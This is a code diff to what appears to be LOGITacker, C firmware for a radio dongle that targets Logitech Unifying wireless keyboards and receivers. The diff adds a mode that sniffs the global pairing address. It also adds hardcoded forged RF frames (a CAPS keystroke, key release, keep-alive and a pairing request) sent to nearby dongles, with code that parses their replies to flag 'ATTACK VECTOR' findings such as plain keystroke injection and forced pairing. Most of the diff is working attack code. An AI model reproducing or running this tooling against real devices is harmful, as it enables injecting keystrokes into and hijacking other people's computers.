@@ -28,7 +28,8 @@ typedef enum {
 typedef enum {
     LOGITACKER_DEVICE_DISCOVERY,   // radio in promiscuous mode, logs devices
     LOGITACKER_DEVICE_ACTIVE_ENUMERATION,   // radio in PTX mode, actively collecting dongle info
-    LOGITACKER_DEVICE_PASSIVE_ENUMERATION   // radio in SNIFF mode, collecting device frames to determin caps
+    LOGITACKER_DEVICE_PASSIVE_ENUMERATION,   // radio in SNIFF mode, collecting device frames to determin caps
+    LOGITACKER_DEVICE_SNIFF_PAIRING   
 } logitacker_mainstate_t;
 
 
@@ -44,7 +45,7 @@ typedef enum {
     LOGITACKER_ACTIVE_ENUM_PHASE_TEST_PLAIN_KEYSTROKE_INJECTION   // tests if plain keystrokes could be injected (press CAPS, listen for LED reports)
 } logitacker_active_enumeration_phase_t;
 
-#define ACTIVE_ENUM_INNER_LOOP_MAX 5 //how many CAPS presses / key releases get send
+
 //uint8_t m_active_enum_inner_loop_count = 0;
 //uint8_t m_active_enum_led_count = 0;
 //static uint8_t m_active_enum_current_address[5];
@@ -90,8 +91,10 @@ typedef struct {
 
 logitacker_state_t m_state_local;
 
-static uint8_t key_report_caps[] = { 0x00, 0xC1, 0x00, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-static uint8_t key_report_release[] = { 0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+static uint8_t rf_report_plain_keys_caps[] = { 0x00, 0xC1, 0x00, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+static uint8_t rf_report_plain_keys_release[] = { 0x00, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+static uint8_t rf_report_pairing_request1[] = { 0xee, 0x5F, 0x01, 0x99, 0x89, 0x9C, 0xCA, 0xB4, 0x08, 0x40, 0x4D, 0x04, 0x02, 0x01, 0x47, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x79 };
+static uint8_t rf_report_keep_alive[] = { 0x00, 0x40, 0x00, 0x08, 0x00 };
 
 static char addr_str_buff[LOGITACKER_DEVICE_ADDR_STR_LEN] = {0};
 static nrf_esb_payload_t tmp_payload = {0};
@@ -250,6 +253,131 @@ void esb_event_handler_passive_enum(nrf_esb_evt_t * p_event) {
     
 }
 
+void esb_event_handler_sniff_pair(nrf_esb_evt_t * p_event) {
+    uint32_t freq;
+    nrf_esb_get_rf_frequency(&freq);
+
+    switch (p_event->evt_id) {
+        case NRF_ESB_EVENT_RX_RECEIVED:
+            NRF_LOG_DEBUG("ESB EVENT HANDLER SNIFF PAIR RX_RECEIVED");
+            //radio_process_rx_passive_enum_mode();
+            while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
+                NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);
+                //Note: LED testing doesn't work on presenters like "R400", because no HID led ouput reports are sent
+                // test if LED report
+            }
+
+            break;
+        case NRF_ESB_EVENT_TX_SUCCESS_ACK_PAY:
+            NRF_LOG_INFO("ACK PAY on channel %d", freq);
+            while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
+                NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);
+                //Note: LED testing doesn't work on presenters like "R400", because no HID led ouput reports are sent
+                // test if LED report
+            }
+            // fall through
+        case NRF_ESB_EVENT_TX_SUCCESS:
+        {
+            uint32_t ticks = APP_TIMER_TICKS(1);
+            NRF_LOG_INFO("TX_SUCCESS on channel %d (restart in %d ticks)", freq, ticks);
+            // write payload again and start rx
+            app_timer_start(m_timer_next_tx_action, ticks, NULL);
+            //nrf_esb_write_payload(&tmp_tx_payload);
+            break;
+        }
+        case NRF_ESB_EVENT_TX_FAILED:
+        {
+            NRF_LOG_INFO("TX_FAILED on all channels, retry %d ...", freq);
+            // write payload again and start rx
+            nrf_esb_start_tx();
+        }
+        default:
+            break;
+    }
+    
+}
+
+// Transfers execution to active_enumeration_subevent_process
+void timer_next_tx_action_handler_sniff_pair(void* p_context) {
+    nrf_esb_write_payload(&tmp_tx_payload);
+}
+
+
+void radio_event_handler_sniff_pair(radio_evt_t const *p_event) {
+    //helper_log_priority("UNIFYING_event_handler");
+    switch (p_event->evt_id)
+    {
+        case RADIO_EVENT_NO_RX_TIMEOUT:
+        {
+            NRF_LOG_INFO("SNIFF PAIRING MODE: no RX on current channel for %d ms ... restart channel hopping ...", LOGITACKER_SNIFF_PAIR_STAY_ON_CHANNEL_AFTER_RX_MS);
+            radio_start_channel_hopping(LOGITACKER_SNIFF_PAIR_CHANNEL_HOP_INTERVAL_MS, 0, true); //start channel hopping directly (0ms delay) with 30ms hop interval, automatically stop hopping on RX
+            break;
+        }
+        case RADIO_EVENT_CHANNEL_CHANGED_FIRST_INDEX:
+        {
+            NRF_LOG_DEBUG("SNIFF PAIRING MODE channel hop reached first channel");
+            bsp_board_led_invert(LED_B); // toggle scan LED everytime we jumped through all channels 
+            break;
+        }
+        default:
+            break;
+    }
+}
+
+
+
+void active_enum_update_tx_payload(uint8_t iteration_count) {
+    uint8_t iter_mod_4 = iteration_count & 0x03;
+
+    if (iteration_count >= (ACTIVE_ENUM_INNER_LOOP_MAX - 4)) {
+        // sequence: Pairing request phase 1, Keep-Alive, Keep-Alive, Keep-Alive
+        switch (iter_mod_4) {
+            case 0:
+            {
+                NRF_LOG_DEBUG("Update payload to PAIRING REQUEST");
+                uint8_t len = sizeof(rf_report_pairing_request1);
+                memcpy(tmp_tx_payload.data, rf_report_pairing_request1, len);
+                tmp_tx_payload.length = len;
+                break;
+            }
+            default:
+                NRF_LOG_DEBUG("Update payload to KEEP ALIVE");
+                memcpy(tmp_tx_payload.data, rf_report_keep_alive, sizeof(rf_report_keep_alive));
+                tmp_tx_payload.length = sizeof(rf_report_keep_alive);
+                break;
+        }
+
+
+    } else {
+        // sequence: CAPS, Keep-Alive, Key release, keep-alive
+        switch (iter_mod_4) {
+            case 0:
+            {
+                NRF_LOG_DEBUG("Update payload to PLAIN KEY CAPS");
+                memcpy(tmp_tx_payload.data, rf_report_plain_keys_caps, sizeof(rf_report_plain_keys_caps));
+                tmp_tx_payload.length = sizeof(rf_report_plain_keys_caps);
+                break;
+            }
+            case 2:
+            {
+                NRF_LOG_DEBUG("Update payload to PLAIN KEY RELEASE");
+                memcpy(tmp_tx_payload.data, rf_report_plain_keys_release, sizeof(rf_report_plain_keys_release));
+                tmp_tx_payload.length = sizeof(rf_report_plain_keys_release);
+                break;
+            }
+            default:
+                NRF_LOG_DEBUG("Update payload to KEEP ALIVE");
+                memcpy(tmp_tx_payload.data, rf_report_keep_alive, sizeof(rf_report_keep_alive));
+                tmp_tx_payload.length = sizeof(rf_report_keep_alive);
+                break;
+        }
+    }
+
+    tmp_tx_payload.pipe = 1;
+    tmp_tx_payload.noack = false; // we need an ack
+
+}
+
 
 // increments pipe 1 address prefix (neighbour discovery)
 bool active_enumeration_set_next_prefix(logitacker_substate_active_enumeration_t * p_state) {
@@ -271,6 +399,8 @@ bool active_enumeration_set_next_prefix(logitacker_substate_active_enumeration_t
     p_state->inner_loop_count = 0; // reset TX_SUCCESS loop count
     p_state->led_count = 0; // reset RX LED report counter
 
+    active_enum_update_tx_payload(p_state->inner_loop_count);
+
 
     return false;
 }
@@ -283,6 +413,7 @@ void active_enum_add_device_address_to_list() {
         NRF_LOG_INFO("failed to add/update device address %s", addr_str_buff);
     }
 }
+
 
 void active_enumeration_subevent_process(logitacker_subevent_t se_type, void *p_subevent) {
     logitacker_substate_active_enumeration_t * p_state = &m_state_local.substate_active_enumeration;
@@ -331,48 +462,63 @@ void active_enumeration_subevent_process(logitacker_subevent_t se_type, void *p_
         case LOGITACKER_SUBEVENT_ESB_TX_SUCCESS_ACK_PAY:
         case LOGITACKER_SUBEVENT_ESB_TX_SUCCESS:
         {
-            NRF_LOG_INFO("ACTIVE ENUMERATION TX_SUCCESS channel: %d (loop %d)", channel_freq, p_state->inner_loop_count);
+            NRF_LOG_DEBUG("ACTIVE ENUMERATION TX_SUCCESS channel: %d (loop %d)", channel_freq, p_state->inner_loop_count);
 
             // if first successful TX to this address, add to list
             if (p_state->inner_loop_count == 0) active_enum_add_device_address_to_list();
 
             // update TX loop count
             p_state->inner_loop_count++;
-            
-            // update payload for next TX (even loop count CAPS, odd key release)
-            if ((p_state->inner_loop_count & 0x01) == 0) {
-                memcpy (tmp_tx_payload.data, key_report_caps, sizeof(key_report_caps));
-            } else {
-                memcpy (tmp_tx_payload.data, key_report_release, sizeof(key_report_release));
+
+            active_enum_update_tx_payload(p_state->inner_loop_count);
+
+
+
+            if (se_type == LOGITACKER_SUBEVENT_ESB_TX_SUCCESS_ACK_PAY) {
+                NRF_LOG_DEBUG("ACK_PAY channel (loop %d)", p_state->inner_loop_count);
+                while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
+                    //Note: LED testing doesn't work on presenters like "R400", because no HID led output reports are sent
+                    // test if LED report
+                    uint8_t device_id = tmp_payload.data[0];
+                    uint8_t rf_report_type = tmp_payload.data[1] & 0x1f;
+                    if (rf_report_type == UNIFYING_RF_REPORT_LED) {
+                        p_state->led_count++;
+                        //device supports plain injection
+                        NRF_LOG_INFO("ATTACK VECTOR: devices accepts plain keystroke injection (LED test succeeded)");
+                        logitacker_device_capabilities_t *p_caps = logitacker_device_get_caps_pointer(p_state->current_rf_address);
+                        if (p_caps != NULL) p_caps->is_plain_keyboard = true;
+                    } else if (rf_report_type == UNIFYING_RF_REPORT_PAIRING && device_id == PAIRING_REQ_MARKER_BYTE) { //data[0] holds byte used in request
+                        //device supports plain injection
+                        NRF_LOG_INFO("ATTACK VECTOR: forced pairing seems possible");
+                        logitacker_device_capabilities_t *p_caps = logitacker_device_get_caps_pointer(p_state->current_rf_address);
+                        if (p_caps != NULL) {
+                            p_caps->forced_pairing_allowed = true;
+                            // dongle wpid is in response (byte 8,9)
+                            p_caps->dongle_WPID = (tmp_payload.data[9] << 8) | tmp_payload.data[10];
+                            if (p_caps->dongle_WPID == 0x8802) p_caps->dongle_is_nordic = true;
+                            if (p_caps->dongle_WPID == 0x8808) p_caps->dongle_is_texas_instruments = true;
+                            NRF_LOG_INFO("Dongle WPID is %.4X (TI: %s, Nordic: %s)", p_caps->dongle_WPID, p_caps->dongle_is_texas_instruments ? "yes" : "no", p_caps->dongle_is_nordic ? "yes" : "no");
+                        }
+
+                    }
+
+                    NRF_LOG_HEXDUMP_DEBUG(tmp_payload.data, tmp_payload.length);
+
+                }
             }
+
 
             if (p_state->inner_loop_count < ACTIVE_ENUM_INNER_LOOP_MAX) {
                 app_timer_start(m_timer_next_tx_action, APP_TIMER_TICKS(p_state->tx_delay_ms), p_subevent);
             } else {
                 // we are done with this device
-                            
+
                 // continue with next prefix, return if first prefixe has been reached again
                 if (active_enumeration_set_next_prefix(p_state)) goto ACTIVE_ENUM_FINISHED;
 
                 // start next transmission
                 if (nrf_esb_write_payload(&tmp_tx_payload) != NRF_SUCCESS) {
                     NRF_LOG_INFO("Error writing payload");
-                }         
-            }
-
-            if (se_type == LOGITACKER_SUBEVENT_ESB_TX_SUCCESS_ACK_PAY) {
-                NRF_LOG_INFO("ACK_PAY channel (loop %d)", p_state->inner_loop_count);
-                while (nrf_esb_read_rx_payload(&tmp_payload) == NRF_SUCCESS) {
-                    NRF_LOG_HEXDUMP_INFO(tmp_payload.data, tmp_payload.length);
-                    //Note: LED testing doesn't work on presenters like "R400", because no HID led ouput reports are sent
-                    // test if LED report
-                    if ((tmp_payload.data[1] & 0x1f) == 0x0e) {
-                        p_state->led_count++;
-                        //device supports plain injection
-                        NRF_LOG_INFO("LED test succeeded .. devices accepts plain injection");
-                        logitacker_device_capabilities_t *p_caps = logitacker_device_get_caps_pointer(p_state->current_rf_address);
-                        if (p_caps != NULL) p_caps->is_plain_keyboard = true;
-                    }
                 }
             }
 
@@ -656,6 +802,64 @@ void logitacker_enter_state_passive_enumeration(uint8_t * rf_address) {
 }
 
 
+void logitacker_enter_state_sniff_pairing() {
+    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, UNIFYING_GLOBAL_PAIRING_ADDRESS);
+    uint8_t base_addr[4] = { 0 };
+    uint8_t prefix = 0;
+    helper_addr_to_base_and_prefix(base_addr, &prefix, UNIFYING_GLOBAL_PAIRING_ADDRESS, 5);
+
+    NRF_LOG_INFO("Sniff pairing on address %s", addr_str_buff);
+
+    
+    nrf_esb_stop_rx(); //stop rx in case running
+    radio_disable_rx_timeout_event(); // disable RX timeouts
+    radio_stop_channel_hopping(); // disable channel hopping
+    
+    m_state_local.mainstate = LOGITACKER_DEVICE_SNIFF_PAIRING;
+    m_state_local.current_bsp_event_handler = NULL;
+    m_state_local.current_radio_event_handler = radio_event_handler_sniff_pair;
+    m_state_local.current_esb_event_handler = esb_event_handler_sniff_pair;    
+    m_state_local.current_timer_event_handler = timer_next_tx_action_handler_sniff_pair;
+
+
+    
+    bsp_board_leds_off(); //disable all LEDs
+
+    uint32_t res = 0;    
+    res = nrf_esb_set_mode(NRF_ESB_MODE_SNIFF);
+    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_mode SNIFF: %d", res);
+    res = nrf_esb_set_base_address_0(base_addr); // set base addr1
+    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
+
+
+
+    // add global pairing address to pipe 0
+    res = nrf_esb_set_base_address_0(base_addr);
+    if (res != NRF_SUCCESS) NRF_LOG_ERROR("nrf_esb_set_base_address_0: %d", res);
+    res = nrf_esb_update_prefix(0, prefix);
+    if (res != NRF_SUCCESS) NRF_LOG_ERROR("update prefix 0: %d", res);
+
+    nrf_esb_enable_pipes(0x01); //enable only pipe 0
+
+    // prepare ping payload
+    tmp_tx_payload.length = 1;
+    tmp_tx_payload.data[0] = 0x00; // no valid unifying payload, but ack'ed on ESB radio layer
+    tmp_tx_payload.pipe = 0; // pipe with global pairing address assigned
+    tmp_tx_payload.noack = false; // we need an ack
+
+    // setup radio as PTX
+    nrf_esb_set_mode(NRF_ESB_MODE_PTX);
+    nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
+    nrf_esb_set_all_channel_tx_failover_loop_count(2); //iterate over channels two time before failing
+
+    m_state_local.mainstate = LOGITACKER_DEVICE_SNIFF_PAIRING;
+
+
+    // write payload (autostart TX is enabled for PTX mode)
+    nrf_esb_write_payload(&tmp_tx_payload);
+
+}
+
 
 void logitacker_enter_state_active_enumeration(uint8_t * rf_address) {
     //clear state
@@ -666,11 +870,14 @@ void logitacker_enter_state_active_enumeration(uint8_t * rf_address) {
     m_state_local.current_radio_event_handler = NULL;
     m_state_local.current_esb_event_handler = esb_event_handler_active_enum;    
     m_state_local.current_timer_event_handler = timer_next_tx_action_handler_active_enum;
-    m_state_local.substate_active_enumeration.tx_delay_ms = 8;
+    m_state_local.substate_active_enumeration.tx_delay_ms = ACTIVE_ENUM_TX_DELAY_MS;
 
     helper_addr_to_base_and_prefix(m_state_local.substate_active_enumeration.base_addr, &m_state_local.substate_active_enumeration.known_prefix, rf_address, LOGITACKER_DEVICE_ADDR_LEN);
     memcpy(m_state_local.substate_active_enumeration.current_rf_address, rf_address, 5);
     m_state_local.substate_active_enumeration.next_prefix = m_state_local.substate_active_enumeration.known_prefix + 1;
+
+    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, m_state_local.substate_active_enumeration.current_rf_address);
+    NRF_LOG_INFO("Start active enumeration for address %s", addr_str_buff);
 
     nrf_esb_stop_rx(); //stop rx in case running
     radio_disable_rx_timeout_event(); // disable RX timeouts
@@ -682,12 +889,10 @@ void logitacker_enter_state_active_enumeration(uint8_t * rf_address) {
     nrf_esb_update_prefix(1, m_state_local.substate_active_enumeration.known_prefix); // set prefix and enable pipe 1
 
 
-    // prepare test TX payload
-    tmp_tx_payload.length = sizeof(key_report_release);
-    memcpy(tmp_tx_payload.data, key_report_release, sizeof(key_report_release)); //note: key reports have keep-alive bit enabled
-    tmp_tx_payload.pipe = 1;
-    tmp_tx_payload.noack = false; // we need an ack
-    
+    // prepare test TX payload (first report will be a pairing request)
+    m_state_local.substate_active_enumeration.inner_loop_count = 0;
+    active_enum_update_tx_payload(m_state_local.substate_active_enumeration.inner_loop_count);
+
     // setup radio as PTX
     nrf_esb_set_mode(NRF_ESB_MODE_PTX);
     nrf_esb_enable_all_channel_tx_failover(true); //retransmit payloads on all channels if transmission fails
@@ -695,8 +900,6 @@ void logitacker_enter_state_active_enumeration(uint8_t * rf_address) {
 
     m_state_local.substate_active_enumeration.phase = LOGITACKER_ACTIVE_ENUM_PHASE_STARTED;
 
-    helper_addr_to_hex_str(addr_str_buff, LOGITACKER_DEVICE_ADDR_LEN, m_state_local.substate_active_enumeration.current_rf_address);
-    NRF_LOG_INFO("Start active enumeration for address %s", addr_str_buff);
 
 
     // write payload (autostart TX is enabled for PTX mode)
@@ -707,8 +910,11 @@ uint32_t logitacker_init() {
     app_timer_create(&m_timer_next_tx_action, APP_TIMER_MODE_SINGLE_SHOT, timer_next_tx_action_handler_main);
 
     //update checksums for logitech payloads
-    unifying_payload_update_checksum(key_report_caps, 10);
-    unifying_payload_update_checksum(key_report_release, 10);
+    unifying_payload_update_checksum(rf_report_plain_keys_caps, sizeof(rf_report_plain_keys_caps));
+    unifying_payload_update_checksum(rf_report_plain_keys_release, sizeof(rf_report_plain_keys_release));
+    rf_report_pairing_request1[0] = PAIRING_REQ_MARKER_BYTE;
+    unifying_payload_update_checksum(rf_report_pairing_request1, sizeof(rf_report_pairing_request1));
+    unifying_payload_update_checksum(rf_report_keep_alive, sizeof(rf_report_keep_alive));
 
     m_state_local.substate_discovery.on_new_address_action = LOGITACKER_DISCOVERY_ON_NEW_ADDRESS_DO_NOTHING;
     logitacker_bsp_init(bsp_event_handler_main);
